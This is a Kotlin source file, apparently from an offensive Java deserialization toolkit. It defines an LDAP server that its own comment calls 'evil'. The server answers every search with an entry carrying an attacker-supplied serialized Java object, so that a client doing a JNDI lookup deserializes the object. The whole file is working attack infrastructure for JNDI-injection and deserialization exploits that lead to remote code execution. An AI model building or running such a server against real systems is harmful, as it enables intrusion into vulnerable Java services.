package top.ceclin.jser.tool.ldap

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchRequest
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor
import com.unboundid.ldap.sdk.Entry
import top.ceclin.jser.tool.Payload
import top.ceclin.jser.tool.PayloadOfGadget
import top.ceclin.jser.tool.Gadget

/**
 * An evil ldap server that returns [payload] as a serialized object for any client lookup operation.
 * As a result, victim will deserialize [payload].
 *
 * [PayloadOfGadget] is helpful to turn a deserialization [Gadget] into [Payload].
 */
class LdapLocal(
    private val payload: Payload,
    port: Int = 1389,
) {

    private val directoryServer = LdapCommon.createDirectoryServer(port) {
        addInMemoryOperationInterceptor(object : InMemoryOperationInterceptor() {
            override fun processSearchRequest(request: InMemoryInterceptedSearchRequest) {
                request.setRequest(LdapCommon.voidSearchRequest)
            }

            override fun processSearchResult(result: InMemoryInterceptedSearchResult) {
                val entry = Entry(result.request.baseDN).apply {
                    addAttribute("objectClass", "javaSerializedObject")
                    addAttribute("javaClassName", "any")
                    addAttribute("javaSerializedData", payload)
                }
                result.sendSearchEntry(entry)
            }
        })
    }

    fun start() {
        directoryServer.startListening()
    }

    fun stop() {
        directoryServer.shutDown(true)
    }
}
